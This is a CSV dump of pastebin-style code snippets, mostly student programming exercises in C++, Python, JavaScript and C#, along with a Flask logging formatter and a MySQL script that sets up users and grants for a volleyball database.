id,title,username,language,date,content
Qn5yhGSB,Сумма цифр числа (E),cyberjab,C++,Thursday 9th of November 2023 03:27:58 PM CDT,"#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>

using namespace std;

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << fixed;
    int n, k;
    int ans = 0;
    cin >> n /*>> k*/;
    priority_queue <int> st;
    /*for (int i = 0; i < n; i++) {
        int x;
        cin >> x;
        st.push(x);
    }*/
    //for (int i = 0; i < k; i++) {
    //    int a = st.top();
    //    st.pop();
    //    string s = to_string(a);
    //    int sm = 0;
    //    for (auto now : s) {
    //        sm += int(now) - 48;
    //    }
    //    /*int sm = (a % 10) + ((a / 10) % 10) + ((a / 100) % 10) + ((a / 1000) % 10) + ((a / 10000) % 10) + ((a / 100000) % 10) + ((a / 1000000) % 10);*/
    //    st.push(a - sm);
    //    ans = sm;
    //    if (sm == 0) {
    //        break;
    //    }
    //}
    //cout << ans;
    while (n > 0) {
        string s = to_string(n);
        int sm = 0;
        for (auto now : s) {
            sm += int(now) - 48;
        }
        cout << n << "" - "" << sm << '\n';
        n -= sm;
    }
}
"
tRW4J3DJ,Попытка E,cyberjab,C++,Thursday 9th of November 2023 03:04:59 PM CDT,"#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>

using namespace std;

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << fixed;
    int n, k;
    int ans = 0;
    cin >> n >> k;
    priority_queue <int> st;
    for (int i = 0; i < n; i++) {
        int x;
        cin >> x;
        st.push(x);
    }
    for (int i = 0; i < k; i++) {
        int a = st.top();
        st.pop();
        string s = to_string(a);
        int sm = 0;
        for (auto now : s) {
            sm += int(now) - 48;
        }
        /*int sm = (a % 10) + ((a / 10) % 10) + ((a / 100) % 10) + ((a / 1000) % 10) + ((a / 10000) % 10) + ((a / 100000) % 10) + ((a / 1000000) % 10);*/
        st.push(a - sm);
        ans = sm;
        if (sm == 0) {
            break;
        }
    }
    cout << ans;
}
"
p38nSnsi,03. Heart Delivery,Spocoman,JavaScript,Thursday 9th of November 2023 02:50:23 PM CDT,"function heartDelivery(input) {
    let houses = input.shift().split('@').map(Number);
    let index = 0;

    while (input[0] !== 'Love!') {
        index += Number(input.shift().slice(5));
        if (index >= houses.length){
            index = 0;
        } 
        
        if (houses[index] == 0) {
            console.log(`Place ${index} already had Valentine's day.`);
        } else {
            houses[index] -= 2;
            if (houses[index] == 0) {
                console.log(`Place ${index} has Valentine's day.`);
            }
        }
    }

    console.log(`Cupid's last position was ${index}.`);
    let houseCount = houses.filter(x => x !== 0).length;
    console.log(houseCount === 0 ? 'Mission was successful.' : `Cupid has failed ${houseCount} places.`);
    return;
}"
dfhyddeQ,03. Heart Delivery,Spocoman,Python,Thursday 9th of November 2023 02:18:42 PM CDT,"houses = list(map(int, input().split('@')))
index = 0

command = input()

while command != ""Love!"":
    command, i = command.split(' ')
    index += int(i)
    if index >= len(houses):
        index = 0
    if houses[index] == 0:
        print(f""Place {index} already had Valentine's day."")
    else:
        houses[index] -= 2
        if houses[index] == 0:
            print(f""Place {index} has Valentine's day."")

    command = input()

print(f""Cupid's last position was {index}."")
house_count = len([i for i in houses if i != 0])
print(""Mission was successful."" if house_count == 0 else f""Cupid has failed {house_count} places."")
"
528ifBqi,Untitled,Sininerebane,C#,Thursday 9th of November 2023 02:17:43 PM CDT,"namespace ConvertorValut
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.OutputEncoding = Encoding.UTF8;
            float rubToEur;
            float eurToRub;
            float rub;
            float euro;
            string userInput;
            float currencyCount;

            rubToEur = 0.01F;
            eurToRub = 98.29F;

            Console.WriteLine(""Добро пожаловать в обменник валют. У нас вы можете обменять рубли в евро и евро в рубли. "");
            Console.WriteLine(""Введите баланс рублей: "");
            rub = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс евро: "");
            euro = Convert.ToSingle(Console.ReadLine());

            Console.WriteLine(""1 - обменять рубли на евро"");
            Console.WriteLine(""2 - обменять евро на рубли"");
            userInput = Console.ReadLine();

            switch (userInput)
            {
                case ""1"":
                    Console.WriteLine(""Обмен рублей на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (rub >= currencyCount)
                    {
                        rub -= currencyCount;
                        euro += currencyCount / eurToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
                case ""2"":
                    Console.WriteLine(""Обмен евро на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if ( euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        rub += currencyCount / rubToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }
                    break;
            }

            Console.WriteLine($""Ваш баланс {rub}  рублей и {euro} евро"");
            Console.ReadKey();
        }
    }
}"
a5P5hrbJ,Untitled,Chefir,C#,Thursday 9th of November 2023 02:10:08 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Test
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int arrayLenght = 15;
            int[] arrayNumbers = new int[arrayLenght];
            FillArray(arrayNumbers);
            Console.WriteLine(""Исходный массив числел: "");
            OutputArray(arrayNumbers);
            Console.WriteLine(""Перемешанный массив числел: "");
            Shuffle(arrayNumbers);
            OutputArray(arrayNumbers);
        }

        static void FillArray(int[] arrayNumbers)
        {
            Random rand = new Random();
            int minNumbers = 0;
            int maxNumbers = 10;

            for (int i = 0; i < arrayNumbers.Length; i++)
            {
                arrayNumbers[i] = rand.Next(minNumbers, maxNumbers);
            }
        }

        static void OutputArray(int[] arrayNumerOutput)
        {
            for (int i = 0; i < arrayNumerOutput.Length; i++)
            {
                Console.WriteLine(arrayNumerOutput[i] + "" "");
            }
        }

        static void Shuffle(int[] arrayNumberShuffle)
        {
            Random rand = new Random();
            int shuffledElement;
            int randomIndex;

            for (int i = 0; i < arrayNumberShuffle.Length; i++)
            {
                randomIndex = rand.Next(arrayNumberShuffle.Length);
                shuffledElement = arrayNumberShuffle[randomIndex];
                arrayNumberShuffle[randomIndex] = arrayNumberShuffle[i];
                arrayNumberShuffle[i] = shuffledElement;
            }
        }"
UDL5cabe,gunicorn fields,web_mc,Python,Thursday 9th of November 2023 01:40:34 PM CDT,"from flask import g, has_request_context
from pythonjsonlogger import jsonlogger


class CustomJsonFormatter(jsonlogger.JsonFormatter):
    def add_fields(self, log_record, record, message_dict):
        super(CustomJsonFormatter, self).add_fields(log_record, record, message_dict)
        if has_request_context():
            log_record[""user_id""] = g.user_id
        else:
            log_record[""user_id""] = 111"
s2LtRQyF,02. Shopping List,Spocoman,Python,Thursday 9th of November 2023 01:37:50 PM CDT,"list_products = input().split('!')

command = input()

while command != ""Go Shopping!"":
    tokens = command.split(' ')
    command = tokens[0]
    product = tokens[1]

    if command == ""Urgent"" and product not in list_products:
        list_products.insert(0, product)
    elif command == ""Unnecessary"" and product in list_products:
        list_products.remove(product)
    elif command == ""Correct"" and product in list_products:
        new_product = tokens[2]
        list_products[list_products.index(product)] = new_product
    elif command == ""Rearrange"" and product in list_products:
        list_products.append(list_products.pop(list_products.index(product)))

    command = input()

print("", "".join(list_products))
"
a26duR8R,Untitled,fatalryuu,MySQL,Thursday 9th of November 2023 01:14:49 PM CDT,"-- Создание пользователей
DROP USER IF EXISTS 'guest'@'localhost';
CREATE USER 'guest'@'localhost'; -- гость
DROP USER IF EXISTS 'player'@'localhost';
CREATE USER 'player'@'localhost' IDENTIFIED BY 'password'; -- игрок
DROP USER IF EXISTS 'coach'@'localhost';
CREATE USER 'coach'@'localhost' IDENTIFIED BY 'password'; -- тренер
DROP USER IF EXISTS 'tournament_organizer'@'localhost';
CREATE USER 'tournament_organizer'@'localhost' IDENTIFIED BY 'password'; -- организатор турнира
DROP USER IF EXISTS 'manager'@'localhost';
CREATE USER 'manager'@'localhost' IDENTIFIED BY 'password'; -- менеджер
DROP USER IF EXISTS 'admin'@'localhost';
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password'; -- администратор

-- Права доступа для ГОСТЯ
GRANT SELECT ON `volleyball_db`.* TO 'guest'@'localhost';

-- Права доступа для ИГРОКА
GRANT SELECT, UPDATE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ТРЕНЕРА
GRANT SELECT, UPDATE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT, UPDATE ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ОРГАНИЗАТОРА ТУРНИРА
GRANT SELECT ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ОРГАНИЗАТОРА МЕНЕДЖЕРА
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для АДМИНИСТРАТОРА 
GRANT ALL PRIVILEGES ON `volleyball_db`.* TO 'admin'@'localhost' WITH GRANT OPTION;
"
Ps9sF3dw,QuickSort C++,hangglider_,C++,Thursday 9th of November 2023 01:04:00 PM CDT,"#include ""bits/stdc++.h""
#define pb push_back
#define ll long long

using namespace std;

template <typename T>
static function<bool(T, T)> cmp = [](T a, T b) {
    return a < b;
};

/*template <typename T>
static bool cmp(T a, T b) {
    return a < b;
};*/

template <typename T>
T G(vector<T>& a, T l, T r) {
    auto mid = l + (r - l) / 2;
    if (a[l] > a[mid])
        swap(a[l], a[mid]);
    if (a[l] > a[r])
        swap(a[l], a[r]);
    if (a[mid] > a[r])
        swap(a[mid], a[r]);
    return mid;
}

template <typename T>
auto F(vector<T>& a, T l, T r, function<bool(T, T)> &cmp) {
    auto m = G(a, l, r);
    auto mid = a[m];
    swap(a[m], a[r]);
    auto i = l - 1;
    for (auto j = l; j <= r - 1; j++) {
        if (cmp(a[j], mid)) swap(a[++i], a[j]);
    }
    swap(a[i + 1], a[r]);
    return ++i;
}

template <typename T>
void Quicksort(vector<T> &a, T l, T r, function<bool(T, T)> &cmp){
    if (l < r){
        auto mid = F(a, l, r, cmp);
        Quicksort(a, l, mid - 1, cmp);
        Quicksort(a, mid + 1, r, cmp);
    }
}

int solve() {
    //int n = 2642245;
    ll n;
    cin >> n;
    random_device rd;
    uniform_int_distribution<long long> dist(1, pow(n, 3) - 1);
    vector<ll> a;
    for (int i = 0; i < n; i++){
        a.pb(dist(rd));
    }
    for (auto &x : a){
        printf(""%d %s"", x, "" "");
    }
    cout << endl;

    Quicksort(a, 0ll, n - 1, cmp<typeof(a[0])>);
    for (auto &x : a){
        printf(""%d %s"", x, "" "");
    }

    return 0;
}

signed main() {
    int q = 1;
    //cin >> q;
    while (q > 0){
        --q;
        solve();
        cout << endl;
    }
    system(""PAUSE"");
    return 0;
}"
